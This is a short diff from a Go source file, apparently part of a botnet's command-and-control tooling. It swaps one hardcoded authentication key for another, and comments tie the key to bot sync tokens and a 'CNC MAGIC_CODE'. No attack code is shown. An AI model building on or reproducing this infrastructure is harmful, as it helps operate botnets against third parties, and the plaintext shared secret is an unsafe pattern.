@@ -65,7 +65,7 @@ var (
 // defaultAuthKey is the auth key baked in at build time by setup.py.
 // Must match bot syncToken / CNC MAGIC_CODE.
 // Can be overridden at runtime with -key flag.
-var defaultAuthKey = "jWwk&7Zfo&dHPbvB" //change me run setup.py
+var defaultAuthKey = "6w#3Q$pES%9ziMRX" //change me run setup.py
 
 // ============================================================================
 // STATS — atomic counters for live monitoring
